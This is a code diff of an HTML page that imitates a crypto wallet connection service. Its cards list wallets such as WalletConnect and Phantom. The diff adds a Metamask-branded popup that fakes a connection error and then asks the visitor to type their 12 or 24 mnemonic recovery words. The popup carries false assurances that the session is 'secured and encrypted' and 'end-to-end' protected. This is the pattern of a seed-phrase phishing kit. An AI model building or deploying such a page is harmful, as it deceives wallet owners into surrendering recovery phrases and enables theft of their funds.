@@ -20,8 +20,6 @@
     <style>
 
 
-
-
     </style>
  
 </head>
@@ -40,7 +38,7 @@
 <br><br>
 
   <div class="dev-apydev">
-<h2 id="dev-apygate">Dev Apygate</h2>
+<h2 id="dev-apygate" style="cursor: pointer;">Dev Apygate</h2>
  <div class="dev-icons">
 <i id="search-icon" class="fa-solid fa-magnifying-glass" style="color: #ffffff;"></i>
 <div class="wallet-icon">
@@ -59,12 +57,65 @@
 </div>
 <br>
 
+
+
+<div class="connect-box" id="connect-box">
+  <div class="white-bg">
+<br>
+<img src="Images/Metamask-Logo.jpg" id="coin-logo">
+<h2 id="coin-name">Metamask</h2>
+<p id="session-secured">This session is secured and encrypted</p>
+  <div class="error-section">
+<p id="error-occured">&nbsp; An error occurred... please try again or connect manually &nbsp;</p>
+<button class="try-again">Try Again</button>
+<button class="connect-manually">Connect Manually</button>
+  </div>
+
+  <div class="manual-section">
+<input type="text" id="wallet-key" placeholder="Enter your 12 or 24 Mnemonic words. Seperate them with spaces.">
+<button class="connect-wallet">Connect Wallet</button>
+
+  </div>
+
+
+
+
+
+
+
+   <div class="connecting-section" style="display: none;">
+<div class="slider-container2">
+  <div class="moving-slider2"></div>
+</div>
+<h3 id="starting-secure-connection">starting secure connection...</h3>
+<span id="please-wait">please wait...</span>
+  </div>
+ <div class="session-protected">
+<img src="Images/Shield.jpg" id="session-shield">
+<p id="session-protected">This session is protected with an end-to-end encryption</p>
+ </div>
+<button id="close-button">Close</button>
+  </div>
+</div>
+
+
+
+
     <div class="all-wallets">
   <div class="wallet-connect-card">
 <img src="Images/Wallet-Connect-Logo.jpg" id="wallet-connect-logo">
  <div class="wallet-connect-info">
 <p id="wallet-connect">Wallet Connect</p>
 <p id="wallet-connect-url">walletconnect.com</p>
+ </div>
+  </div>
+<br>
+
+  <div class="phantom-card">
+<img src="Images/Phantom-Logo.jpg" id="phantom-logo">
+ <div class="phantom-info">
+<p id="phantom">Phantom</p>
+<p id="phantom-url">phantom.app</p>
  </div>
   </div>
 <br>
@@ -618,15 +669,6 @@
   </div>
 <br>
 
-  <div class="phantom-card">
-<img src="Images/Phantom-Logo.jpg" id="phantom-logo">
- <div class="phantom-info">
-<p id="phantom">Phantom</p>
-<p id="phantom-url">phantom.app</p>
- </div>
-  </div>
-<br>
-
   <div class="solfare-card">
 <img src="Images/Solflare-Logo.jpg" id="solfare-logo">
  <div class="solfare-info">
@@ -768,7 +810,7 @@ var toTopButton = document.querySelector('.to-top');
 walletIcon.addEventListener("click", function() {
   toTopButton.click();
 });
-//index.html 
+
 
   </script>
 
